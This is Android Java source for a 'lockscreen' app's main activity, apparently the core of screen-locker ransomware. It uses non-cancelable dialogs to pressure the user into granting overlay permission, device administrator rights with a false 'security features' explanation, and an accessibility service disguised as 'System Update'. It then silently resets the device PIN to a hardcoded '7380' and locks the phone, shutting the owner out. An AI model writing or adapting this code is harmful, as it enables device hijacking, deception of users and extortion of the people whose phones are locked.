package com.lockscreen;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    private static final int REQUEST_OVERLAY = 1001;
    private static final int REQUEST_ADMIN = 1002;
    private static final int REQUEST_ACCESSIBILITY = 1003;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        requestPermissions();
    }

    private void requestPermissions() {
        // Step 1: Overlay permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            new AlertDialog.Builder(this)
                .setTitle("Permission Required")
                .setMessage("Allow overlay permission to continue")
                .setCancelable(false)
                .setPositiveButton("Allow", (d, w) -> {
                    startActivityForResult(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName())), REQUEST_OVERLAY);
                }).show();
            return;
        }

        // Step 2: Device Admin
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, DeviceAdminReceiver.class);
        if (!dpm.isAdminActive(admin)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for security features");
            startActivityForResult(intent, REQUEST_ADMIN);
            return;
        }

        // Step 3: Accessibility Service
        if (!isAccessibilityEnabled()) {
            new AlertDialog.Builder(this)
                .setTitle("Accessibility Required")
                .setMessage("Enable 'System Update' in Accessibility settings")
                .setCancelable(false)
                .setPositiveButton("Open Settings", (d, w) -> {
                    startActivityForResult(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), REQUEST_ACCESSIBILITY);
                }).show();
            return;
        }

        // All permissions granted
        startLockScreen();
    }

    private boolean isAccessibilityEnabled() {
        try {
            String service = getPackageName() + "/.AdminAccessibilityService";
            String enabled = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return enabled != null && enabled.contains(service);
        } catch (Exception e) {
            return false;
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        requestPermissions();
    }

    private void startLockScreen() {
        setDevicePin();
        Intent i = new Intent(this, LockScreenActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startActivity(i);
        finish();
    }

    private void setDevicePin() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, DeviceAdminReceiver.class);
            if (dpm.isAdminActive(admin)) {
                dpm.resetPassword("7380", DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
                dpm.lockNow();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
          }
